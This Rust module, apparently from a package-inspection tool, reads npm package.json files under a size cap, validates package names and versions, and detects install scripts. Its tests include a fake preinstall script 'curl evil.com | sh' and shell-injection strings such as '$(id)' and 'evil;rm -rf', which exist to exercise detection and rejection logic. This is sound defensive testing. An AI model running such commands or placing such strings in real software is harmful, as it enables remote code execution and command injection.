use super::MetadataField;
use std::io::Read;
use std::path::Path;

/// Largest `package.json` we will read. Real manifests are a few KB (the
/// biggest in the wild are well under 1 MiB); anything larger in a cache dir
/// is treated as unreadable instead of being pulled into memory.
const MAX_PACKAGE_JSON_BYTES: u64 = 1024 * 1024;

/// Read `<dir>/package.json` as UTF-8, reading at most
/// `MAX_PACKAGE_JSON_BYTES + 1` bytes from disk. `None` if it is missing,
/// unreadable, not UTF-8, or larger than the limit. Every npm metadata reader
/// goes through this so a huge file cannot stall or exhaust ccmd.
fn read_package_json(dir: &Path) -> Option<String> {
    let file = std::fs::File::open(dir.join("package.json")).ok()?;
    read_bounded(file, MAX_PACKAGE_JSON_BYTES)
}

/// Read UTF-8 from `reader`, consuming at most `max + 1` bytes: the extra byte
/// is how an over-limit input is told apart from one that is exactly `max`.
/// Returns `None` for over-limit or non-UTF-8 input. Split out from
/// `read_package_json` so the cap on bytes consumed can be tested directly.
fn read_bounded(reader: impl Read, max: u64) -> Option<String> {
    let mut content = String::new();
    reader.take(max + 1).read_to_string(&mut content).ok()?;
    (content.len() as u64 <= max).then_some(content)
}

pub fn semantic_name(path: &Path) -> Option<String> {
    let name = path.file_name()?.to_string_lossy().to_string();

    match name.as_str() {
        "_cacache" => Some("Content Cache".to_string()),
        "_logs" => Some("Install Logs".to_string()),
        "_npx" => Some("npx Cache".to_string()),
        _ => {
            // Hash directories inside _npx: read package.json for package name
            if path.is_dir()
                && let Some(pkg) = npx_package_name(path)
            {
                return Some(pkg);
            }
            None
        }
    }
}

/// Read package.json inside an npx hash dir to find the package name.
fn npx_package_name(path: &Path) -> Option<String> {
    let content = read_package_json(path)?;

    // Look for "_npx": { "packages": ["name"] }
    // Simple JSON parsing without a dependency
    if let Some(npx_pos) = content.find("\"_npx\"") {
        let rest = &content[npx_pos..];
        if let Some(pkg_pos) = rest.find("\"packages\"") {
            let pkg_rest = &rest[pkg_pos..];
            // Find the array contents
            if let Some(bracket_start) = pkg_rest.find('[')
                && let Some(bracket_end) = pkg_rest[bracket_start..].find(']')
            {
                let array_str = &pkg_rest[bracket_start + 1..bracket_start + bracket_end];
                let packages: Vec<&str> = array_str
                    .split(',')
                    .map(|s| s.trim().trim_matches('"').trim())
                    .filter(|s| !s.is_empty())
                    .collect();
                if packages.len() == 1 {
                    return Some(format!("[npx] {}", packages[0]));
                } else if packages.len() > 1 {
                    return Some(format!(
                        "[npx] {} (+{} more)",
                        packages[0],
                        packages.len() - 1
                    ));
                }
            }
        }
    }

    // Fallback: look at dependencies
    if let Some(deps_pos) = content.find("\"dependencies\"") {
        let rest = &content[deps_pos..];
        if let Some(brace_start) = rest.find('{')
            && let Some(brace_end) = rest[brace_start..].find('}')
        {
            let deps_str = &rest[brace_start + 1..brace_start + brace_end];
            let dep_names: Vec<&str> = deps_str
                .split(',')
                .filter_map(|entry| {
                    let parts: Vec<&str> = entry.splitn(2, ':').collect();
                    if parts.len() == 2 {
                        Some(parts[0].trim().trim_matches('"').trim())
                    } else {
                        None
                    }
                })
                .filter(|s| !s.is_empty())
                .collect();
            if dep_names.len() == 1 {
                return Some(format!("[npx] {}", dep_names[0]));
            } else if dep_names.len() > 1 {
                return Some(format!(
                    "[npx] {} (+{} more)",
                    dep_names[0],
                    dep_names.len() - 1
                ));
            }
        }
    }

    None
}

/// Package identity from the ROOT-level `name` / `version` string fields of
/// `package.json`. This is cache content anyone can write, and the identity
/// keys dedup, OSV queries, registry checks and displayed results, so it is
/// parsed as real JSON (nested objects and field-like text inside strings
/// cannot spoof it) and both fields must be valid npm coordinates. A
/// duplicated root key resolves to the last one, as with `JSON.parse` in npm.
pub fn package_id(path: &Path) -> Option<super::PackageId> {
    identity(path).ok()
}

/// Why a package directory has no identity (#117). A scan that skips such a
/// directory must say so: otherwise the package looks absent, or clean.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum Unidentified {
    MissingManifest,
    TooLarge,
    Unreadable,
    NotJson,
    NoNameOrVersion,
    InvalidName,
    InvalidVersion,
}

impl Unidentified {
    pub fn describe(self) -> &'static str {
        match self {
            Self::MissingManifest => "no package.json",
            Self::TooLarge => "package.json larger than 1 MiB",
            Self::Unreadable => "package.json unreadable or not UTF-8",
            Self::NotJson => "package.json is not valid JSON",
            Self::NoNameOrVersion => "package.json has no string name and version",
            Self::InvalidName => "package.json name is not a valid npm name",
            Self::InvalidVersion => "package.json version is not a concrete semver version",
        }
    }
}

/// [`package_id`] with the reason it failed.
pub fn identity(path: &Path) -> Result<super::PackageId, Unidentified> {
    let file = std::fs::File::open(path.join("package.json")).map_err(|e| {
        if e.kind() == std::io::ErrorKind::NotFound {
            Unidentified::MissingManifest
        } else {
            Unidentified::Unreadable
        }
    })?;
    // Only the length is asked of the file to tell "too large" from "not
    // UTF-8"; the bytes still go through the bounded reader.
    let too_large = file
        .metadata()
        .is_ok_and(|m| m.len() > MAX_PACKAGE_JSON_BYTES);
    let content = read_bounded(file, MAX_PACKAGE_JSON_BYTES).ok_or(if too_large {
        Unidentified::TooLarge
    } else {
        Unidentified::Unreadable
    })?;
    let root: serde_json::Value =
        serde_json::from_str(&content).map_err(|_| Unidentified::NotJson)?;
    let field = |key: &str| {
        root.as_object()
            .and_then(|o| o.get(key))
            .and_then(|v| v.as_str())
    };
    let (Some(name), Some(version)) = (field("name"), field("version")) else {
        return Err(Unidentified::NoNameOrVersion);
    };
    if !is_valid_npm_name(name) {
        return Err(Unidentified::InvalidName);
    }
    if !is_valid_npm_version(version) {
        return Err(Unidentified::InvalidVersion);
    }
    Ok(super::PackageId {
        ecosystem: "npm",
        name: name.to_string(),
        version: version.to_string(),
    })
}

/// Why `path` should have been a package but is not one, or `None` when it is
/// identified or is not a package location at all.
///
/// A package location is a directory directly inside `node_modules` (or inside
/// an `@scope` directory there). Dot-directories (`.bin`, `.cache`, `.pnpm`)
/// and scope directories themselves are not packages.
pub fn unidentified_reason(path: &Path) -> Option<Unidentified> {
    if !is_package_location(path) {
        return None;
    }
    identity(path).err()
}

fn is_package_location(path: &Path) -> bool {
    let Some(name) = path.file_name().and_then(|n| n.to_str()) else {
        return false;
    };
    if name.starts_with('.') || name.starts_with('@') {
        return false;
    }
    let Some(parent) = path.parent() else {
        return false;
    };
    let parent_name = parent.file_name().and_then(|n| n.to_str());
    let under_node_modules = match parent_name {
        Some("node_modules") => true,
        Some(scope) if scope.starts_with('@') => {
            parent
                .parent()
                .and_then(|g| g.file_name())
                .and_then(|n| n.to_str())
                == Some("node_modules")
        }
        _ => false,
    };
    // The name tests are free; the stat is last, because this runs for every
    // npm-kind entry the walk could not identify (every file in `_cacache`).
    under_node_modules && path.is_dir()
}

/// `pkg` or `@scope/pkg`, at most 214 bytes. Each segment is non-empty, does
/// not start with `.` or `_`, and uses only `A-Za-z0-9` and `-._~` (legacy
/// packages may contain uppercase). This keeps path separators, whitespace and
/// shell metacharacters out of identities that end up in commands and queries.
fn is_valid_npm_name(name: &str) -> bool {
    let segment_ok = |s: &str| {
        !s.is_empty()
            && !s.starts_with(['.', '_'])
            && s.bytes()
                .all(|b| b.is_ascii_alphanumeric() || b"-._~".contains(&b))
    };
    if name.is_empty() || name.len() > 214 {
        return false;
    }
    match name.strip_prefix('@') {
        Some(rest) => rest
            .split_once('/')
            .is_some_and(|(scope, pkg)| segment_ok(scope) && segment_ok(pkg)),
        None => segment_ok(name),
    }
}

/// A concrete semver version, `MAJOR.MINOR.PATCH[-prerelease][+build]`, at most
/// 256 bytes. The three core parts are all digits; prerelease and build are
/// dot-separated, non-empty identifiers of `A-Za-z0-9-`. Tags (`latest`),
/// ranges, `v`-prefixed and partial versions (`1.2`, `1..2`) are rejected:
/// the installed version feeds dedup and OSV queries, so it must be exact.
fn is_valid_npm_version(version: &str) -> bool {
    let identifiers_ok = |s: &str| {
        s.split('.')
            .all(|id| !id.is_empty() && id.bytes().all(|b| b.is_ascii_alphanumeric() || b == b'-'))
    };
    if version.len() > 256 {
        return false;
    }
    let (rest, build) = match version.split_once('+') {
        Some((rest, build)) => (rest, Some(build)),
        None => (version, None),
    };
    let (core, pre) = match rest.split_once('-') {
        Some((core, pre)) => (core, Some(pre)),
        None => (rest, None),
    };
    let mut parts = core.split('.');
    let core_ok = (0..3).all(|_| {
        parts
            .next()
            .is_some_and(|p| !p.is_empty() && p.bytes().all(|b| b.is_ascii_digit()))
    }) && parts.next().is_none();
    core_ok && pre.is_none_or(identifiers_ok) && build.is_none_or(identifiers_ok)
}

pub fn metadata(path: &Path) -> Vec<MetadataField> {
    let mut fields = Vec::new();
    let name = path
        .file_name()
        .map(|n| n.to_string_lossy().to_string())
        .unwrap_or_default();

    match name.as_str() {
        "_cacache" => {
            fields.push(MetadataField {
                label: "Contents".to_string(),
                value: "npm content-addressable cache".to_string(),
            });
            let content_dir = path.join("content-v2");
            if content_dir.exists() {
                fields.push(MetadataField {
                    label: "Format".to_string(),
                    value: "content-v2 + index-v5".to_string(),
                });
            }
        }
        "_logs" => {
            fields.push(MetadataField {
                label: "Contents".to_string(),
                value: "npm install/update logs".to_string(),
            });
            if let Ok(entries) = std::fs::read_dir(path) {
                let count = entries.filter_map(|e| e.ok()).count();
                fields.push(MetadataField {
                    label: "Log files".to_string(),
                    value: count.to_string(),
                });
            }
        }
        _ => {}
    }

    // For packages inside node_modules: show dependency depth and install scripts
    let path_str = path.to_string_lossy();
    if path_str.contains("node_modules") {
        // Dependency depth
        let depth = dep_depth(path);
        fields.push(MetadataField {
            label: "Dep depth".to_string(),
            value: if depth == 0 {
                "direct".to_string()
            } else {
                format!("transitive (depth {})", depth)
            },
        });

        // Install script detection
        if let Some(scripts) = detect_install_scripts(path) {
            fields.push(MetadataField {
                label: "⚠ Scripts".to_string(),
                value: scripts,
            });
        }
    }

    fields
}

/// Count how many node_modules levels deep this package is.
/// Direct dependency = 0, transitive = 1+.
fn dep_depth(path: &Path) -> usize {
    let path_str = path.to_string_lossy();
    // Count occurrences of /node_modules/ after the first one
    path_str.matches("node_modules").count().saturating_sub(1)
}

/// Detect install scripts (preinstall, install, postinstall) in package.json.
fn detect_install_scripts(path: &Path) -> Option<String> {
    let content = read_package_json(path)?;

    let mut found = Vec::new();
    for script_name in &["preinstall", "install", "postinstall"] {
        // Look for "scriptname": in the scripts block
        let pattern = format!("\"{}\"", script_name);
        if content.contains(&pattern) {
            // Verify it's inside a "scripts" block (rough check)
            if let Some(scripts_pos) = content.find("\"scripts\"") {
                let rest = &content[scripts_pos..];
                if rest.contains(&pattern) {
                    found.push(*script_name);
                }
            }
        }
    }

    if found.is_empty() {
        None
    } else {
        Some(found.join(", "))
    }
}

#[cfg(test)]
mod tests {
    // --- #117: say why a package directory has no identity ---

    fn nm_pkg(root: &Path, rel: &str, json: Option<&str>) -> std::path::PathBuf {
        let dir = root.join("node_modules").join(rel);
        std::fs::create_dir_all(&dir).unwrap();
        if let Some(j) = json {
            std::fs::write(dir.join("package.json"), j).unwrap();
        }
        dir
    }

    #[test]
    fn identity_names_the_reason_for_each_failure() {
        let t = tempfile::tempdir().unwrap();
        let r = t.path();
        let case = |rel: &str, json: Option<&str>| identity(&nm_pkg(r, rel, json)).unwrap_err();
        assert_eq!(case("a", None), Unidentified::MissingManifest);
        assert_eq!(case("b", Some("{not json")), Unidentified::NotJson);
        assert_eq!(
            case("c", Some(r#"{"name":"c"}"#)),
            Unidentified::NoNameOrVersion
        );
        assert_eq!(case("d", Some("[1,2]")), Unidentified::NoNameOrVersion);
        assert_eq!(
            case("e", Some(r#"{"name":"../e","version":"1.0.0"}"#)),
            Unidentified::InvalidName
        );
        assert_eq!(
            case("f", Some(r#"{"name":"f","version":"latest"}"#)),
            Unidentified::InvalidVersion
        );
        let big = format!(
            r#"{{"name":"g","version":"1.0.0","x":"{}"}}"#,
            "a".repeat(2 * 1024 * 1024)
        );
        assert_eq!(case("g", Some(&big)), Unidentified::TooLarge);
        let d = nm_pkg(r, "h", None);
        std::fs::write(d.join("package.json"), [0xff, 0xfe]).unwrap();
        assert_eq!(identity(&d).unwrap_err(), Unidentified::Unreadable);
    }

    #[test]
    fn identity_agrees_with_package_id() {
        let t = tempfile::tempdir().unwrap();
        let ok = nm_pkg(t.path(), "ok", Some(r#"{"name":"ok","version":"1.2.3"}"#));
        assert_eq!(identity(&ok).unwrap(), package_id(&ok).unwrap());
        let bad = nm_pkg(t.path(), "bad", Some("{"));
        assert!(identity(&bad).is_err() && package_id(&bad).is_none());
    }

    #[test]
    fn only_package_locations_are_reported_as_unidentified() {
        let t = tempfile::tempdir().unwrap();
        let r = t.path();
        // Reported: a package directory, plain and scoped, with a bad manifest.
        let plain = nm_pkg(r, "broken", Some("{"));
        let scoped = nm_pkg(r, "@acme/broken", Some("{"));
        assert_eq!(unidentified_reason(&plain), Some(Unidentified::NotJson));
        assert_eq!(unidentified_reason(&scoped), Some(Unidentified::NotJson));
        // Not reported: identified packages, scope dirs, dot dirs, and
        // directories that are merely inside a package.
        let good = nm_pkg(r, "good", Some(r#"{"name":"good","version":"1.0.0"}"#));
        assert_eq!(unidentified_reason(&good), None);
        assert_eq!(unidentified_reason(&r.join("node_modules/@acme")), None);
        let bin = nm_pkg(r, ".bin", None);
        assert_eq!(unidentified_reason(&bin), None);
        let inner = good.join("lib");
        std::fs::create_dir_all(&inner).unwrap();
        assert_eq!(unidentified_reason(&inner), None);
        // The npx project directory has a manifest with no name; it is not
        // under node_modules, so it is not a package.
        let npx = r.join(".npm/_npx/abc");
        std::fs::create_dir_all(&npx).unwrap();
        std::fs::write(npx.join("package.json"), r#"{"dependencies":{}}"#).unwrap();
        assert_eq!(unidentified_reason(&npx), None);
    }

    use super::*;
    use std::path::PathBuf;

    #[test]
    fn semantic_name_cacache() {
        assert_eq!(
            semantic_name(&PathBuf::from("/npm/_cacache")),
            Some("Content Cache".into())
        );
    }

    #[test]
    fn semantic_name_npx() {
        assert_eq!(
            semantic_name(&PathBuf::from("/npm/_npx")),
            Some("npx Cache".into())
        );
    }

    #[test]
    fn semantic_name_npx_hash_with_package() {
        let tmp = tempfile::tempdir().unwrap();
        let hash_dir = tmp.path().join("abc123");
        std::fs::create_dir_all(&hash_dir).unwrap();
        std::fs::write(
            hash_dir.join("package.json"),
            r#"{"dependencies":{"lighthouse":"^12"},"_npx":{"packages":["lighthouse"]}}"#,
        )
        .unwrap();

        assert_eq!(semantic_name(&hash_dir), Some("[npx] lighthouse".into()));
    }

    #[test]
    fn semantic_name_npx_hash_with_multiple_packages() {
        let tmp = tempfile::tempdir().unwrap();
        let hash_dir = tmp.path().join("def456");
        std::fs::create_dir_all(&hash_dir).unwrap();
        std::fs::write(
            hash_dir.join("package.json"),
            r#"{"_npx":{"packages":["create-react-app","typescript"]}}"#,
        )
        .unwrap();

        let result = semantic_name(&hash_dir).unwrap();
        assert!(result.contains("[npx] create-react-app"), "{}", result);
        assert!(result.contains("+1 more"), "{}", result);
    }

    #[test]
    fn semantic_name_complex_package_json_no_panic() {
        // Regression: package.json with ] appearing before [ in substring caused slice panic
        let tmp = tempfile::tempdir().unwrap();
        let hash_dir = tmp.path().join("complex");
        std::fs::create_dir_all(&hash_dir).unwrap();
        std::fs::write(
            hash_dir.join("package.json"),
            r#"{
                "scripts": {
                    "build": { "dependencies": ["rollup", "tsc"] },
                    "e2e": { "files": ["tests/**/*.py"], "dependencies": ["build"] }
                },
                "_npx": { "packages": ["my-tool"] }
            }"#,
        )
        .unwrap();

        let result = semantic_name(&hash_dir);
        assert_eq!(result, Some("[npx] my-tool".into()));
    }

    #[test]
    fn semantic_name_nested_braces_in_deps() {
        // Dependencies block with nested objects before the actual deps
        let tmp = tempfile::tempdir().unwrap();
        let hash_dir = tmp.path().join("nested");
        std::fs::create_dir_all(&hash_dir).unwrap();
        std::fs::write(
            hash_dir.join("package.json"),
            r#"{
                "config": { "nested": { "deep": true } },
                "dependencies": { "express": "^4.0.0" }
            }"#,
        )
        .unwrap();

        let result = semantic_name(&hash_dir);
        assert_eq!(result, Some("[npx] express".into()));
    }

    #[test]
    fn semantic_name_no_npx_no_deps() {
        let tmp = tempfile::tempdir().unwrap();
        let hash_dir = tmp.path().join("empty");
        std::fs::create_dir_all(&hash_dir).unwrap();
        std::fs::write(
            hash_dir.join("package.json"),
            r#"{"name": "something", "version": "1.0.0"}"#,
        )
        .unwrap();

        assert_eq!(semantic_name(&hash_dir), None);
    }

    #[test]
    fn semantic_name_npx_hash_no_package_json() {
        let tmp = tempfile::tempdir().unwrap();
        let hash_dir = tmp.path().join("xyz");
        std::fs::create_dir_all(&hash_dir).unwrap();
        assert_eq!(semantic_name(&hash_dir), None);
    }

    #[test]
    fn package_id_from_node_modules() {
        let tmp = tempfile::tempdir().unwrap();
        let pkg_dir = tmp.path().join("_npx/abc/node_modules/express");
        std::fs::create_dir_all(&pkg_dir).unwrap();
        std::fs::write(
            pkg_dir.join("package.json"),
            r#"{"name": "express", "version": "4.21.0"}"#,
        )
        .unwrap();

        let id = package_id(&pkg_dir).unwrap();
        assert_eq!(id.name, "express");
        assert_eq!(id.version, "4.21.0");
        assert_eq!(id.ecosystem, "npm");
    }

    // ---- package_id: identity comes only from root-level string fields (#96) ----

    /// Write `json` as `<tmp>/pkg/package.json` and return `package_id` of it.
    fn package_id_of(json: &str) -> Option<crate::providers::PackageId> {
        let tmp = tempfile::tempdir().unwrap();
        let dir = tmp.path().join("pkg");
        std::fs::create_dir_all(&dir).unwrap();
        std::fs::write(dir.join("package.json"), json).unwrap();
        package_id(&dir)
    }

    #[test]
    fn package_id_ignores_nested_name_and_version_before_root_fields() {
        // A nested object earlier in the file must not spoof the identity that
        // dedup, OSV queries and registry checks are keyed on.
        let id = package_id_of(
            r#"{"dist":{"name":"evil","version":"9.9.9"},"name":"real","version":"1.0.0"}"#,
        )
        .unwrap();
        assert_eq!((id.name.as_str(), id.version.as_str()), ("real", "1.0.0"));
    }

    #[test]
    fn package_id_ignores_field_like_text_inside_strings() {
        let id = package_id_of(
            r#"{"description":"x \"name\": \"evil\", \"version\": \"9.9.9\"","name":"real","version":"1.0.0"}"#,
        )
        .unwrap();
        assert_eq!((id.name.as_str(), id.version.as_str()), ("real", "1.0.0"));
    }

    #[test]
    fn package_id_duplicate_root_keys_last_wins_like_json_parse() {
        // npm itself reads package.json with JSON.parse, where the last
        // duplicate key wins; we must agree with the tool that will install it.
        let id = package_id_of(r#"{"name":"first","name":"second","version":"1.0.0"}"#).unwrap();
        assert_eq!(id.name, "second");
    }

    #[test]
    fn package_id_rejects_non_string_missing_or_empty_fields() {
        for json in [
            r#"{"name":123,"version":"1.0.0"}"#,
            r#"{"name":"a","version":1}"#,
            r#"{"name":null,"version":"1.0.0"}"#,
            r#"{"name":{"x":"a"},"version":"1.0.0"}"#,
            r#"{"version":"1.0.0"}"#,
            r#"{"name":"a"}"#,
            r#"{"name":"","version":"1.0.0"}"#,
            r#"{"name":"a","version":""}"#,
            r#"["name","version"]"#,
            r#"not json {"name":"a","version":"1.0.0"}"#,
            "",
        ] {
            assert!(package_id_of(json).is_none(), "must reject: {json}");
        }
    }

    #[test]
    fn package_id_rejects_invalid_npm_coordinates() {
        for name in [
            "has space",
            "../etc",
            "a/b",
            "@scope",
            "@/x",
            "@scope/",
            "@a/b/c",
            ".hidden",
            "_private",
            "evil;rm -rf",
            "x\\ny",
            "$(id)",
        ] {
            let json = format!(r#"{{"name":"{name}","version":"1.0.0"}}"#);
            assert!(package_id_of(&json).is_none(), "must reject name: {name}");
        }
        for version in [
            "1.0 0",
            "1.0.0;ls",
            "../1",
            "1.0.0\\n2",
            // Tags and malformed versions pass a charset check but are not
            // concrete versions; they must not reach dedup/OSV queries.
            "latest",
            "banana",
            ".",
            "1..2",
            "1.2",
            "1.2.3.4",
            "1.2.x",
            "v1.2.3",
            "-1.2.3",
            "1.2.3-",
            "1.2.3+",
            "1.2.3-a..b",
            "1.2.3-+b",
        ] {
            let json = format!(r#"{{"name":"ok","version":"{version}"}}"#);
            assert!(
                package_id_of(&json).is_none(),
                "must reject version: {version}"
            );
        }
        assert!(
            package_id_of(&format!(
                r#"{{"name":"{}","version":"1.0.0"}}"#,
                "a".repeat(215)
            ))
            .is_none()
        );
    }

    #[test]
    fn package_id_accepts_scoped_names_and_semver_prerelease_build() {
        let id =
            package_id_of(r#"{"name":"@babel/core","version":"7.0.0-beta.1+build.5"}"#).unwrap();
        assert_eq!(id.name, "@babel/core");
        assert_eq!(id.version, "7.0.0-beta.1+build.5");
        for version in ["0.0.0", "1.2.3-rc.1", "1.2.3+build.5", "2.0.0-x-y.1-2+a-b"] {
            let json = format!(r#"{{"name":"ok","version":"{version}"}}"#);
            assert!(package_id_of(&json).is_some(), "must accept: {version}");
        }
        // Legacy packages may contain uppercase and dots.
        assert!(package_id_of(r#"{"name":"JSONStream","version":"1.3.5"}"#).is_some());
        assert!(package_id_of(r#"{"name":"lodash.get","version":"4.4.2"}"#).is_some());
    }

    #[test]
    fn dep_depth_direct() {
        let path = PathBuf::from("/home/user/.npm/_npx/abc/node_modules/express");
        assert_eq!(dep_depth(&path), 0);
    }

    #[test]
    fn dep_depth_transitive() {
        let path = PathBuf::from("/home/user/.npm/_npx/abc/node_modules/express/node_modules/qs");
        assert_eq!(dep_depth(&path), 1);
    }

    #[test]
    fn dep_depth_deep_transitive() {
        let path = PathBuf::from("/npm/_npx/a/node_modules/a/node_modules/b/node_modules/c");
        assert_eq!(dep_depth(&path), 2);
    }

    // ---- bounded package.json reads (#97) ---------------------------------------

    /// `json` padded with trailing spaces to exactly `len` bytes (still valid
    /// JSON), written as `<tmp>/pkg/package.json`.
    fn pkg_dir_with_json_of_len(json: &str, len: usize) -> (tempfile::TempDir, PathBuf) {
        assert!(json.len() <= len);
        let tmp = tempfile::tempdir().unwrap();
        let dir = tmp.path().join("pkg");
        std::fs::create_dir_all(&dir).unwrap();
        let mut content = String::from(json);
        content.push_str(&" ".repeat(len - json.len()));
        std::fs::write(dir.join("package.json"), content).unwrap();
        (tmp, dir)
    }

    const ID_JSON: &str = r#"{"name":"big","version":"1.0.0"}"#;
    const NPX_JSON: &str = r#"{"_npx":{"packages":["big"]}}"#;
    const SCRIPTS_JSON: &str = r#"{"scripts":{"postinstall":"node x.js"}}"#;

    #[test]
    fn package_json_at_the_size_limit_is_still_read() {
        let (_t, dir) = pkg_dir_with_json_of_len(ID_JSON, MAX_PACKAGE_JSON_BYTES as usize);
        assert_eq!(package_id(&dir).unwrap().name, "big");
        let (_t, dir) = pkg_dir_with_json_of_len(NPX_JSON, MAX_PACKAGE_JSON_BYTES as usize);
        assert_eq!(npx_package_name(&dir), Some("[npx] big".into()));
        let (_t, dir) = pkg_dir_with_json_of_len(SCRIPTS_JSON, MAX_PACKAGE_JSON_BYTES as usize);
        assert_eq!(detect_install_scripts(&dir), Some("postinstall".into()));
    }

    #[test]
    fn oversized_package_json_is_rejected_by_every_reader() {
        // A huge file in a cache dir must not be read into memory in full: all
        // three readers refuse anything over the limit (DoS, issue #97).
        let over = MAX_PACKAGE_JSON_BYTES as usize + 1;
        let (_t, dir) = pkg_dir_with_json_of_len(ID_JSON, over);
        assert!(package_id(&dir).is_none());
        let (_t, dir) = pkg_dir_with_json_of_len(NPX_JSON, over);
        assert!(npx_package_name(&dir).is_none());
        let (_t, dir) = pkg_dir_with_json_of_len(SCRIPTS_JSON, over);
        assert!(detect_install_scripts(&dir).is_none());
    }

    #[test]
    fn read_package_json_never_reads_more_than_the_limit_plus_one() {
        // Far larger than the limit: the reader must bail without needing the
        // whole file (checked by the result, and by the bounded `take`).
        let (_t, dir) = pkg_dir_with_json_of_len(ID_JSON, MAX_PACKAGE_JSON_BYTES as usize * 4);
        assert!(read_package_json(&dir).is_none());
    }

    /// A reader that can supply `available` bytes and records how many were
    /// actually consumed, so a test can assert the cap on I/O itself and not
    /// just on the returned value.
    struct CountingReader {
        available: u64,
        consumed: u64,
    }

    impl std::io::Read for CountingReader {
        fn read(&mut self, buf: &mut [u8]) -> std::io::Result<usize> {
            let n = (buf.len() as u64).min(self.available - self.consumed) as usize;
            buf[..n].fill(b' ');
            self.consumed += n as u64;
            Ok(n)
        }
    }

    #[test]
    fn read_bounded_consumes_at_most_limit_plus_one_bytes() {
        // 64x the limit available; without `take` the reader would be drained
        // (64 MiB), which is exactly the unbounded read #97 is about.
        let limit = MAX_PACKAGE_JSON_BYTES;
        let mut reader = CountingReader {
            available: limit * 64,
            consumed: 0,
        };
        assert!(read_bounded(&mut reader, limit).is_none());
        assert!(
            reader.consumed <= limit + 1,
            "consumed {} bytes, cap is {}",
            reader.consumed,
            limit + 1
        );
    }

    #[test]
    fn read_bounded_returns_content_at_exactly_the_limit() {
        let mut reader = CountingReader {
            available: 10,
            consumed: 0,
        };
        assert_eq!(read_bounded(&mut reader, 10).as_deref(), Some("          "));
        let mut reader = CountingReader {
            available: 11,
            consumed: 0,
        };
        assert!(read_bounded(&mut reader, 10).is_none());
    }

    #[test]
    fn read_package_json_missing_or_non_utf8_is_none() {
        let tmp = tempfile::tempdir().unwrap();
        assert!(read_package_json(tmp.path()).is_none());
        std::fs::write(tmp.path().join("package.json"), [0xff, 0xfe, 0x00]).unwrap();
        assert!(read_package_json(tmp.path()).is_none());
    }

    #[test]
    fn detect_install_scripts_postinstall() {
        let tmp = tempfile::tempdir().unwrap();
        let pkg_dir = tmp.path().join("esbuild");
        std::fs::create_dir_all(&pkg_dir).unwrap();
        std::fs::write(
            pkg_dir.join("package.json"),
            r#"{"name":"esbuild","version":"0.27.2","scripts":{"postinstall":"node install.js"}}"#,
        )
        .unwrap();

        assert_eq!(
            detect_install_scripts(&pkg_dir),
            Some("postinstall".to_string())
        );
    }

    #[test]
    fn detect_install_scripts_multiple() {
        let tmp = tempfile::tempdir().unwrap();
        let pkg_dir = tmp.path().join("suspicious");
        std::fs::create_dir_all(&pkg_dir).unwrap();
        std::fs::write(
            pkg_dir.join("package.json"),
            r#"{"name":"sus","scripts":{"preinstall":"curl evil.com | sh","postinstall":"node setup.js"}}"#,
        ).unwrap();

        let scripts = detect_install_scripts(&pkg_dir).unwrap();
        assert!(scripts.contains("preinstall"), "{}", scripts);
        assert!(scripts.contains("postinstall"), "{}", scripts);
    }

    #[test]
    fn detect_install_scripts_none() {
        let tmp = tempfile::tempdir().unwrap();
        let pkg_dir = tmp.path().join("safe");
        std::fs::create_dir_all(&pkg_dir).unwrap();
        std::fs::write(
            pkg_dir.join("package.json"),
            r#"{"name":"safe","scripts":{"test":"jest","build":"tsc"}}"#,
        )
        .unwrap();

        assert_eq!(detect_install_scripts(&pkg_dir), None);
    }

    #[test]
    fn detect_install_scripts_no_scripts_block() {
        let tmp = tempfile::tempdir().unwrap();
        let pkg_dir = tmp.path().join("minimal");
        std::fs::create_dir_all(&pkg_dir).unwrap();
        std::fs::write(
            pkg_dir.join("package.json"),
            r#"{"name":"minimal","version":"1.0.0"}"#,
        )
        .unwrap();

        assert_eq!(detect_install_scripts(&pkg_dir), None);
    }
}
